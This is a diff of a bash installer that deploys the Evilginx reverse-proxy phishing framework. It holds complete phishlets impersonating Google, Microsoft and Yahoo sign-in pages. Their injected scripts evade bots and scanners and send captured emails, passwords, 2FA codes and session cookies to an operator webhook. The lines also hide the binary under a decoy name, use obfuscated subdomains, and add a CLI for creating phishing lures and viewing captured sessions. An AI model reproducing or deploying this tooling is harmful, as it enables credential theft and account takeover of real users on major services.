@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================================================
-# Evilginx Setup - Complete Installer with Enhanced Phishlets
+# Evilginx HTTP-Only Setup - Uses Your Phishlets
 # ============================================================================
 
 set -euo pipefail
@@ -8,7 +8,6 @@ set -euo pipefail
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[0;33m'
-BLUE='\033[0;34m'
 CYAN='\033[0;36m'
 NC='\033[0m'
 
@@ -17,8 +16,8 @@ print_banner() {
     echo -e "${CYAN}"
     cat << "EOF"
     ╔══════════════════════════════════════════════════════════════════╗
-    ║                    Evilginx Setup v3.0                           ║
-    ║              Enhanced Phishlets | Bot Detection                  ║
+    ║                    Evilginx HTTP-Only Setup                      ║
+    ║              Uses Your Custom Phishlets                          ║
     ║                    Like Fpages - Simple & Clean                  ║
     ╚══════════════════════════════════════════════════════════════════╝
 EOF
@@ -33,31 +32,40 @@ print_banner
 
 # Get configuration
 log "Please enter your configuration:"
-read -p "  Domain (e.g., motarmos.click): " DOMAIN
+read -p "  Domain (e.g., motarmo.click): " DOMAIN
 read -p "  VPS IP Address: " VPS_IP
-read -p "  Cloudflare API Token: " CF_TOKEN
-read -p "  Telegram Bot Token (optional): " TG_TOKEN
-read -p "  Telegram Chat ID (optional): " TG_CHAT
+read -p "  HTTP Port (default 80): " HTTP_PORT
+HTTP_PORT=${HTTP_PORT:-80}
 
-WEBHOOK_SECRET=$(openssl rand -hex 16)
+if [[ -z "$DOMAIN" ]] || [[ -z "$VPS_IP" ]]; then
+    error "Domain and VPS IP are required"
+fi
+
+# Get script directory
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+
+# Check if phishlets exist
+if [[ ! -d "$SCRIPT_DIR/phishlets" ]]; then
+    error "phishlets/ directory not found! Place your phishlets in ./phishlets/"
+fi
+
+if [[ ! -f "$SCRIPT_DIR/phishlets/google.yaml" ]] || \
+   [[ ! -f "$SCRIPT_DIR/phishlets/microsoft.yaml" ]] || \
+   [[ ! -f "$SCRIPT_DIR/phishlets/yahoo.yaml" ]]; then
+    error "Missing phishlet files in ./phishlets/ directory"
+fi
+
+log "Found your phishlets:"
+ls -la "$SCRIPT_DIR/phishlets/"
 
 # Install dependencies
 log "Installing dependencies..."
 apt-get update -y >/dev/null 2>&1
-apt-get install -y git curl wget build-essential golang-go openssl jq dnsutils expect nginx >/dev/null 2>&1
-
-# Prevent Out-of-Memory during build on small VPS instances
-TOTAL_RAM=$(free -m | awk '/^Mem:/{print $2}')
-if [[ "$TOTAL_RAM" -lt 1900 ]] && [[ $(swapon --show | wc -l) -eq 0 ]]; then
-    log "Creating 2GB swap file to prevent memory errors..."
-    fallocate -l 2G /swapfile || dd if=/dev/zero of=/swapfile bs=1M count=2048
-    chmod 600 /swapfile
-    mkswap /swapfile
-    swapon /swapfile
-fi
+apt-get install -y git curl wget build-essential golang-go openssl jq dnsutils expect >/dev/null 2>&1
 
 # Install Go if needed
 if ! command -v go &>/dev/null; then
+    log "Installing Go..."
     wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
     tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
     export PATH=$PATH:/usr/local/go/bin
@@ -70,420 +78,66 @@ rm -rf /tmp/evilginx2
 git clone https://github.com/kgretzky/evilginx2.git /tmp/evilginx2 2>/dev/null
 cd /tmp/evilginx2
 go build -buildvcs=false -o evilginx 2>/dev/null
-cp evilginx /usr/local/bin/sys-svc
-chmod +x /usr/local/bin/sys-svc
+cp evilginx /usr/local/bin/evilginx
+chmod +x /usr/local/bin/evilginx
 
 # Create directories
-mkdir -p /opt/gateway/{config,phishlets,certs,storage,logs,notifications,html}
+log "Creating directories..."
+mkdir -p /opt/evilginx/{config,phishlets,certs,lures,logs}
 
-# Generate random subdomain prefixes (obfuscated - no brand names)
+# Generate random subdomain prefixes (obfuscated)
 EP1="gw-$(openssl rand -hex 3)"
 EP2="auth-$(openssl rand -hex 3)"
 EP3="portal-$(openssl rand -hex 3)"
 
-echo "$EP1" > /opt/gateway/.ep1
-echo "$EP2" > /opt/gateway/.ep2
-echo "$EP3" > /opt/gateway/.ep3
+echo "$EP1" > /opt/evilginx/.ep1
+echo "$EP2" > /opt/evilginx/.ep2
+echo "$EP3" > /opt/evilginx/.ep3
 
-# Copy phishlets from local directory
-log "Deploying phishlets..."
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+WEBHOOK_SECRET=$(openssl rand -hex 16)
 
-if [[ -f "$SCRIPT_DIR/phishlets/google.yaml" ]]; then
-    cp "$SCRIPT_DIR/phishlets/google.yaml" /opt/gateway/phishlets/
-    cp "$SCRIPT_DIR/phishlets/microsoft.yaml" /opt/gateway/phishlets/
-    cp "$SCRIPT_DIR/phishlets/yahoo.yaml" /opt/gateway/phishlets/
-else
-    # Create phishlets directly if files not found
-    cat > /opt/gateway/phishlets/google.yaml << 'EOF'
-name: 'google'
-min_ver: '3.0.0'
-proxy_hosts:
-  - {phish_sub: '{{.Endpoint3}}', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
-sub_filters:
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: '{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json'], replace_all: true}
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html', 'application/json'], replace_all: true}
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '.google.com', replace: '.{{.Domain}}', headers: ['Set-Cookie']}
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Secure;', replace: '', headers: ['Set-Cookie']}
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'SameSite=Lax', replace: 'SameSite=None', headers: ['Set-Cookie']}
-auth_tokens:
-  - domain: '.google.com'
-    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'LSID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID']
-  - domain: 'accounts.google.com'
-    keys: ['GAPS', 'LSID', 'GV']
-credentials:
-  username:
-    key: 'identifier'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'Passwd'
-    search: '(.*)'
-    type: 'post'
-  twofa:
-    key: 'TotpPin'
-    search: '([0-9]{6})'
-    type: 'post'
-login:
-  domain: 'accounts.google.com'
-  path: '/v3/signin/identifier'
-  paths:
-    - '/v3/signin/identifier'
-    - '/v3/signin/challenge/pwd'
-    - '/v3/signin/challenge/sk'
-    - '/v3/signin/challenge/totp'
-js_inject:
-  - trigger_domains: ['{{.Endpoint3}}.{{.Domain}}', 'accounts.google.com']
-    trigger_paths: ['/.*']
-    script: |
-      (function() {
-        const ua = navigator.userAgent.toLowerCase();
-        const isBot = /bot|crawler|spider|scanner|curl|wget|python|go-http|headless|phantom|selenium|puppeteer|playwright/i.test(ua);
-        if (isBot || navigator.webdriver || /headless/i.test(ua)) {
-            window.location.href = "https://www.google.com";
-            return;
-        }
-        const api = "https://{{.Domain}}/api/webhook";
-        const secret = "{{.WebhookSecret}}";
-        const source = "google";
-        let capturedEmail = '';
-        let sessionCaptured = false;
-        function sendData(type, email, password, code) {
-          const payload = { event: type, source: source, remote_addr: "{{.VpsIp}}" };
-          if (email) payload.email = email;
-          if (password) payload.password = password;
-          if (code) payload.code = code;
-          fetch(api, {
-            method: "POST",
-            headers: { "Content-Type": "application/json", "X-Webhook-Secret": secret },
-            body: JSON.stringify(payload)
-          }).catch(function(e){});
-        }
-        function extractSessionCookies() {
-          if (sessionCaptured) return;
-          sessionCaptured = true;
-          sendData("session", capturedEmail, null, null);
-        }
-        function observeForm() {
-          const forms = document.querySelectorAll('form');
-          forms.forEach(function(form) {
-            if (form.hasAttribute('data-listener')) return;
-            form.setAttribute('data-listener', 'true');
-            form.addEventListener('submit', function() {
-              setTimeout(function() {
-                const emailInput = document.querySelector('input[type="email"], input[name="identifier"]');
-                const passInput = document.querySelector('input[type="password"], input[name="Passwd"]');
-                const codeInput = document.querySelector('input[name="TotpPin"], input[name="otc"]');
-                const email = emailInput ? emailInput.value : null;
-                const password = passInput ? passInput.value : null;
-                const code = codeInput ? codeInput.value : null;
-                if (email && email !== capturedEmail) {
-                  capturedEmail = email;
-                  sendData("email", email, null, null);
-                }
-                if (password) {
-                  sendData("credentials", capturedEmail || email, password, null);
-                }
-                if (code && code.length === 6) {
-                  sendData("2fa", capturedEmail || email, null, code);
-                }
-              }, 100);
-            });
-          });
-        }
-        setInterval(function() {
-          if (!sessionCaptured && capturedEmail && document.cookie.includes('SID')) {
-            extractSessionCookies();
-          }
-        }, 2000);
-        observeForm();
-        new MutationObserver(observeForm).observe(document.body, { childList: true, subtree: true });
-      })();
-webhook:
-  url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
-  headers:
-    X-Webhook-Secret: "{{.WebhookSecret}}"
-  format: "json"
-  events: ["email", "credentials", "2fa", "session"]
-EOF
-
-    cat > /opt/gateway/phishlets/microsoft.yaml << 'EOF'
-name: 'microsoft'
-min_ver: '3.0.0'
-proxy_hosts:
-  - {phish_sub: '{{.Endpoint2}}', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false, auto_filter: true}
-  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, auto_filter: true}
-sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: '{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json'], replace_all: true}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'logincdn.msauth.net', replace: 'logincdn.{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript'], replace_all: true}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'aadcdn.msftauth.net', replace: 'aadcdn.{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript'], replace_all: true}
-  - {triggers_on: 'logincdn.msauth.net', orig_sub: 'logincdn', domain: 'msauth.net', search: 'login.microsoftonline.com', replace: '{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript'], replace_all: true}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '.login.microsoftonline.com', replace: '.{{.Domain}}', headers: ['Set-Cookie']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'Secure;', replace: '', headers: ['Set-Cookie']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'SameSite=Lax', replace: 'SameSite=None', headers: ['Set-Cookie']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'redirect_uri=https://login.microsoftonline.com', replace: 'redirect_uri=https://{{.Endpoint2}}.{{.Domain}}', headers: ['Location']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'Access-Control-Allow-Origin: https://login.microsoftonline.com', replace: 'Access-Control-Allow-Origin: https://{{.Endpoint2}}.{{.Domain}}', headers: ['Access-Control-Allow-Origin']}
-auth_tokens:
-  - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTH_LIGHT', 'SignInStateCookie']
-  - domain: '.microsoftonline.com'
-    keys: ['SignInStateCookie', 'ESTSAUTH']
-  - domain: 'login.microsoftonline.com'
-    keys: ['MSFPC']
-credentials:
-  username:
-    key: 'loginfmt'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'passwd'
-    search: '(.*)'
-    type: 'post'
-  twofa:
-    key: 'otc'
-    search: '([0-9]{6})'
-    type: 'post'
-login:
-  domain: 'login.microsoftonline.com'
-  path: '/'
-  paths:
-    - '/'
-    - '/common/oauth2/v2.0/authorize'
-js_inject:
-  - trigger_domains: ['{{.Endpoint2}}.{{.Domain}}', 'login.microsoftonline.com']
-    trigger_paths: ['/.*']
-    script: |
-      (function() {
-        const ua = navigator.userAgent.toLowerCase();
-        const isBot = /bot|crawler|spider|scanner|curl|wget|python|go-http|headless|phantom|selenium|puppeteer|playwright/i.test(ua);
-        if (isBot || navigator.webdriver || /headless/i.test(ua)) {
-            window.location.href = "https://www.google.com";
-            return;
-        }
-        const api = "https://{{.Domain}}/api/webhook";
-        const secret = "{{.WebhookSecret}}";
-        const source = "microsoft";
-        let capturedEmail = '';
-        let sessionCaptured = false;
-        function sendData(type, email, password, code) {
-          const payload = { event: type, source: source, email: email, password: password, code: code, remote_addr: "{{.VpsIp}}" };
-          fetch(api, {
-            method: "POST",
-            headers: { "Content-Type": "application/json", "X-Webhook-Secret": secret },
-            body: JSON.stringify(payload)
-          }).catch(function(){});
-        }
-        function capture() {
-          const emailInput = document.querySelector('input[name="loginfmt"], input[type="email"]');
-          const passInput = document.querySelector('input[name="passwd"], input[type="password"]');
-          const codeInput = document.querySelector('input[name="otc"], input[id="idTxtBx_OTP_Code"]');
-          if (emailInput && emailInput.value && emailInput.value !== capturedEmail) {
-            capturedEmail = emailInput.value;
-            sendData("email", capturedEmail, null, null);
-          }
-          if (passInput && passInput.value) {
-            sendData("credentials", capturedEmail, passInput.value, null);
-          }
-          if (codeInput && codeInput.value && codeInput.value.length === 6) {
-            sendData("2fa", capturedEmail, null, codeInput.value);
-          }
-        }
-        function checkSession() {
-          if (!sessionCaptured && capturedEmail && document.cookie.includes('ESTSAUTH')) {
-            sessionCaptured = true;
-            sendData("session", capturedEmail, null, null);
-          }
-        }
-        setInterval(capture, 500);
-        setInterval(checkSession, 3000);
-        document.addEventListener('submit', function() { setTimeout(capture, 200); });
-        new MutationObserver(capture).observe(document.body, { childList: true, subtree: true });
-      })();
-webhook:
-  url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
-  headers:
-    X-Webhook-Secret: "{{.WebhookSecret}}"
-  format: "json"
-  events: ["email", "credentials", "2fa", "session"]
-EOF
-
-    cat > /opt/gateway/phishlets/yahoo.yaml << 'EOF'
-name: 'yahoo'
-min_ver: '3.0.0'
-proxy_hosts:
-  - {phish_sub: '{{.Endpoint1}}', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'yahoo.com', session: true, auto_filter: true}
-  - {phish_sub: 'api', orig_sub: 'api', domain: 'login.yahoo.com', session: true, auto_filter: true}
-  - {phish_sub: 'consent', orig_sub: 'consent', domain: 'yahoo.com', session: true, auto_filter: true}
-  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'yahoo.com', session: true, auto_filter: true}
-sub_filters:
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json'], replace_all: true}
-  - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'guce.yahoo.com', replace: 'guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript'], replace_all: true}
-  - {triggers_on: 'api.login.yahoo.com', orig_sub: 'api', domain: 'login.yahoo.com', search: 'api.login.yahoo.com', replace: 'api.{{.Endpoint1}}.{{.Domain}}', mimes: ['application/json'], replace_all: true}
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://login.yahoo.com', replace: 'https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html'], replace_all: true}
-  - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'https://guce.yahoo.com', replace: 'https://guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html'], replace_all: true}
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '.yahoo.com', replace: '.{{.Domain}}', mimes: ['text/html'], headers: ['Set-Cookie']}
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'Secure;', replace: '', headers: ['Set-Cookie']}
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'SameSite=Lax', replace: 'SameSite=None', headers: ['Set-Cookie']}
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://login.yahoo.com', replace: 'https://{{.Endpoint1}}.{{.Domain}}', headers: ['Location', 'Refresh']}
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'Access-Control-Allow-Origin: https://login.yahoo.com', replace: 'Access-Control-Allow-Origin: https://{{.Endpoint1}}.{{.Domain}}', headers: ['Access-Control-Allow-Origin']}
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login\\.yahoo\\.com', replace: '{{.Endpoint1}}\\.{{.Domain}}', mimes: ['application/json'], replace_all: true}
-auth_tokens:
-  - domain: '.yahoo.com'
-    keys: ['A3', 'A1', 'A1S', 'Y', 'T', 'S', 'PH', 'B', 'X']
-  - domain: 'login.yahoo.com'
-    keys: ['B', 'X', 'SESSION_ID']
-  - domain: '.guce.yahoo.com'
-    keys: ['GUCE', 'GUCS']
-credentials:
-  username:
-    key: 'username'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
-  twofa:
-    key: 'verificationCode'
-    search: '([0-9]{6})'
-    type: 'post'
-login:
-  domain: 'login.yahoo.com'
-  path: '/'
-js_inject:
-  - trigger_domains: ['{{.Endpoint1}}.{{.Domain}}', 'login.yahoo.com']
-    trigger_paths: ['/.*']
-    script: |
-      (function() {
-        const ua = navigator.userAgent.toLowerCase();
-        const isBot = /bot|crawler|spider|scanner|curl|wget|python|go-http|headless|phantom|selenium|puppeteer|playwright/i.test(ua);
-        if (isBot || navigator.webdriver || /headless/i.test(ua)) {
-            window.location.href = "https://www.google.com";
-            return;
-        }
-        const api = "https://{{.Domain}}/api/webhook";
-        const secret = "{{.WebhookSecret}}";
-        const source = "yahoo";
-        let capturedEmail = '';
-        let sessionCaptured = false;
-        function sendData(type, email, password, code) {
-          const payload = { event: type, source: source, email: email, password: password, code: code, remote_addr: "{{.VpsIp}}" };
-          fetch(api, {
-            method: "POST",
-            headers: { "Content-Type": "application/json", "X-Webhook-Secret": secret },
-            body: JSON.stringify(payload)
-          }).catch(function(){});
-        }
-        function capture() {
-          const emailInput = document.querySelector('input[name="username"], input[type="email"]');
-          const passInput = document.querySelector('input[name="password"], input[type="password"]');
-          const codeInput = document.querySelector('input[name="verificationCode"], input[type="tel"]');
-          if (emailInput && emailInput.value && emailInput.value !== capturedEmail) {
-            capturedEmail = emailInput.value;
-            sendData("email", capturedEmail, null, null);
-          }
-          if (passInput && passInput.value) {
-            sendData("credentials", capturedEmail, passInput.value, null);
-          }
-          if (codeInput && codeInput.value && codeInput.value.length >= 6) {
-            sendData("2fa", capturedEmail, null, codeInput.value);
-          }
-        }
-        function checkSession() {
-          if (!sessionCaptured && capturedEmail && document.cookie.includes('A3')) {
-            sessionCaptured = true;
-            sendData("session", capturedEmail, null, null);
-          }
-        }
-        setInterval(capture, 500);
-        setInterval(checkSession, 3000);
-        document.addEventListener('submit', function() { setTimeout(capture, 500); });
-        new MutationObserver(capture).observe(document.body, { childList: true, subtree: true });
-      })();
-webhook:
-  url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
-  headers:
-    X-Webhook-Secret: "{{.WebhookSecret}}"
-  format: "json"
-  events: ["email", "credentials", "2fa", "session"]
-EOF
-fi
-
-# Update phishlets with actual values
-log "Configuring phishlets with your domain..."
-sed -i "s/{{.Domain}}/$DOMAIN/g" /opt/gateway/phishlets/*.yaml
-sed -i "s/{{.Endpoint1}}/$EP1/g" /opt/gateway/phishlets/yahoo.yaml
-sed -i "s/{{.Endpoint2}}/$EP2/g" /opt/gateway/phishlets/microsoft.yaml
-sed -i "s/{{.Endpoint3}}/$EP3/g" /opt/gateway/phishlets/google.yaml
-sed -i "s/{{.VpsIp}}/$VPS_IP/g" /opt/gateway/phishlets/*.yaml
-sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" /opt/gateway/phishlets/*.yaml
-sed -i "s/{{.AppPort}}/443/g" /opt/gateway/phishlets/*.yaml
-
-# Create Evilginx config
-cat > /opt/gateway/config/config.yaml << EOF
+# Create HTTP-only config
+log "Creating configuration..."
+cat > /opt/evilginx/config/config.yaml << EOF
 daemon: false
 debug: false
 domain: $DOMAIN
 ipv4: $VPS_IP
-http_port: 80
-https_port: 443
+http_port: $HTTP_PORT
+https_port: 0
 dns_port: 0
 autocert: false
-phishlets_path: /opt/gateway/phishlets
-cert_path: /opt/gateway/certs
-database: /opt/gateway/evilginx.db
+phishlets_path: /opt/evilginx/phishlets
+cert_path: /opt/evilginx/certs
+database: /opt/evilginx/evilginx.db
 unauth_url: https://www.google.com
-blacklist:
-  enabled: true
-  max_requests: 10
-  block_duration: 3600
 EOF
 
-# Setup SSL with Cloudflare
-log "Setting up SSL certificate..."
-apt-get install -y certbot python3-certbot-dns-cloudflare >/dev/null 2>&1
+# Copy your phishlets to Evilginx directory
+log "Copying your phishlets..."
+cp "$SCRIPT_DIR/phishlets/google.yaml" /opt/evilginx/phishlets/
+cp "$SCRIPT_DIR/phishlets/microsoft.yaml" /opt/evilginx/phishlets/
+cp "$SCRIPT_DIR/phishlets/yahoo.yaml" /opt/evilginx/phishlets/
 
-cat > /etc/letsencrypt/cloudflare.ini << EOF
-dns_cloudflare_api_token = $CF_TOKEN
-EOF
-chmod 600 /etc/letsencrypt/cloudflare.ini
+# Update placeholders in phishlets
+log "Configuring phishlets with your domain..."
+sed -i "s/{{.Domain}}/$DOMAIN/g" /opt/evilginx/phishlets/*.yaml
+sed -i "s/{{.Endpoint1}}/$EP1/g" /opt/evilginx/phishlets/yahoo.yaml
+sed -i "s/{{.Endpoint2}}/$EP2/g" /opt/evilginx/phishlets/microsoft.yaml
+sed -i "s/{{.Endpoint3}}/$EP3/g" /opt/evilginx/phishlets/google.yaml
+sed -i "s/{{.VpsIp}}/$VPS_IP/g" /opt/evilginx/phishlets/*.yaml
+sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" /opt/evilginx/phishlets/*.yaml
+sed -i "s/{{.AppPort}}/80/g" /opt/evilginx/phishlets/*.yaml
 
-log "Verifying DNS A record propagation for $DOMAIN..."
-MAX_ATTEMPTS=30
-for ((i=1; i<=MAX_ATTEMPTS; i++)); do
-    CURRENT_IP=$(dig +short "$DOMAIN" @1.1.1.1 | tail -n1)
-    if [[ "$CURRENT_IP" == "$VPS_IP" ]]; then
-        log "DNS confirmed: $DOMAIN is pointing to $VPS_IP"
-        break
-    fi
-    if [[ $i -eq $MAX_ATTEMPTS ]]; then
-        warn "DNS for $DOMAIN is currently '$CURRENT_IP', expected '$VPS_IP'."
-        warn "Attempting certificate request anyway..."
-    else
-        echo -ne "  [i] Waiting for DNS to point to $VPS_IP... (Attempt $i/$MAX_ATTEMPTS)\r"
-        sleep 10
-    fi
-done
-echo ""
-
-log "Requesting wildcard certificate for *.$DOMAIN..."
-certbot certonly --dns-cloudflare \
-    --dns-cloudflare-credentials /etc/letsencrypt/cloudflare.ini \
-    --dns-cloudflare-propagation-seconds 120 \
-    --non-interactive --agree-tos --email "admin@$DOMAIN" \
-    -d "$DOMAIN" -d "*.$DOMAIN" || true
-
-if [[ -d "/etc/letsencrypt/live/$DOMAIN" ]]; then
-    ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "/opt/gateway/certs/$DOMAIN.crt"
-    ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "/opt/gateway/certs/$DOMAIN.key"
-    log "SSL certificate installed successfully"
-else
-    error "SSL certificate acquisition failed. Cannot proceed without HTTPS."
-fi
+# Change HTTPS to HTTP in phishlets (for HTTP mode)
+log "Converting HTTPS to HTTP in phishlets..."
+sed -i 's|https://{{.Domain}}|http://{{.Domain}}|g' /opt/evilginx/phishlets/*.yaml
+sed -i 's|https://accounts.google.com|http://{{.Endpoint3}}.{{.Domain}}|g' /opt/evilginx/phishlets/google.yaml
+sed -i 's|https://login.microsoftonline.com|http://{{.Endpoint2}}.{{.Domain}}|g' /opt/evilginx/phishlets/microsoft.yaml
+sed -i 's|https://login.yahoo.com|http://{{.Endpoint1}}.{{.Domain}}|g' /opt/evilginx/phishlets/yahoo.yaml
 
 # Create systemd service
+log "Creating systemd service..."
 cat > /etc/systemd/system/evilginx.service << EOF
 [Unit]
 Description=Evilginx Service
@@ -492,8 +146,8 @@ After=network.target
 [Service]
 Type=simple
 User=root
-WorkingDirectory=/opt/gateway
-ExecStart=/usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets
+WorkingDirectory=/opt/evilginx
+ExecStart=/usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets
 Restart=always
 RestartSec=5
 StandardOutput=journal
@@ -507,8 +161,168 @@ systemctl daemon-reload
 systemctl enable evilginx
 systemctl start evilginx
 
-# Create a symlink for the management command
-ln -sf /usr/local/bin/sys-svc /usr/local/bin/evilginx-cli
+# Create CLI tool
+log "Creating CLI tool..."
+cat > /usr/local/bin/evilginx-cli << 'CLIEOF'
+#!/bin/bash
+# Evilginx CLI - Interactive Command Tool
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+show_help() {
+    echo ""
+    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
+    echo -e "${GREEN}Evilginx Commands:${NC}"
+    echo ""
+    echo -e "${YELLOW}Service:${NC}"
+    echo -e "  ${GREEN}restart${NC}        - Restart evilginx service"
+    echo -e "  ${GREEN}status${NC}         - Show service status"
+    echo -e "  ${GREEN}sessions${NC}       - Show captured sessions"
+    echo -e "  ${GREEN}traffic${NC}        - Show traffic statistics"
+    echo ""
+    echo -e "${YELLOW}Phishlets:${NC}"
+    echo -e "  ${GREEN}phishlets${NC}      - List all phishlets"
+    echo -e "  ${GREEN}enable <name>${NC}  - Enable phishlet (google/microsoft/yahoo)"
+    echo -e "  ${GREEN}disable <name>${NC} - Disable phishlet"
+    echo ""
+    echo -e "${YELLOW}Lures:${NC}"
+    echo -e "  ${GREEN}lures create <name>${NC} - Create new phishing URL"
+    echo -e "  ${GREEN}lures list${NC}          - List all lures"
+    echo -e "  ${GREEN}lures url <id>${NC}      - Get URL for lure ID"
+    echo ""
+    echo -e "${YELLOW}Other:${NC}"
+    echo -e "  ${GREEN}help${NC}            - Show this help"
+    echo -e "  ${GREEN}exit${NC}            - Exit CLI"
+    echo ""
+    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
+}
+
+restart() {
+    sudo systemctl restart evilginx
+    echo -e "${GREEN}[✓] Evilginx restarted${NC}"
+}
+
+status() {
+    if systemctl is-active --quiet evilginx; then
+        echo -e "${GREEN}[✓] Evilginx is RUNNING${NC}"
+    else
+        echo -e "${RED}[✗] Evilginx is STOPPED${NC}"
+    fi
+}
+
+traffic() {
+    echo -e "${BLUE}[*] Traffic Statistics:${NC}"
+    if [[ -f "/opt/evilginx/evilginx.db" ]]; then
+        TOTAL=$(sudo sqlite3 /opt/evilginx/evilginx.db "SELECT COUNT(*) FROM sessions;" 2>/dev/null || echo "0")
+        echo -e "  ${GREEN}Total Visitors:${NC} $TOTAL"
+    else
+        echo "  No data yet"
+    fi
+}
+
+sessions() {
+    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets -sessions
+}
+
+phishlets() {
+    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets -phishlets
+}
+
+enable_phishlet() {
+    echo -e "${BLUE}[*] Enabling $1...${NC}"
+    sudo systemctl stop evilginx
+    sleep 1
+    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets > /tmp/evilginx.out 2>&1 <<EOF
+phishlets enable $1
+exit
+EOF
+    sudo systemctl start evilginx
+    echo -e "${GREEN}[✓] $1 enabled${NC}"
+}
+
+disable_phishlet() {
+    echo -e "${BLUE}[*] Disabling $1...${NC}"
+    sudo systemctl stop evilginx
+    sleep 1
+    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets > /tmp/evilginx.out 2>&1 <<EOF
+phishlets disable $1
+exit
+EOF
+    sudo systemctl start evilginx
+    echo -e "${GREEN}[✓] $1 disabled${NC}"
+}
+
+create_lure() {
+    echo -e "${BLUE}[*] Creating lure for $1...${NC}"
+    sudo systemctl stop evilginx
+    sleep 1
+    output=$(sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets <<EOF
+lures create $1
+lures get-url 0
+exit
+EOF
+)
+    url=$(echo "$output" | grep -E "http://" | head -1)
+    sudo systemctl start evilginx
+    if [[ -n "$url" ]]; then
+        echo -e "${GREEN}[✓] Lure created!${NC}"
+        echo -e "${CYAN}URL: ${url}${NC}"
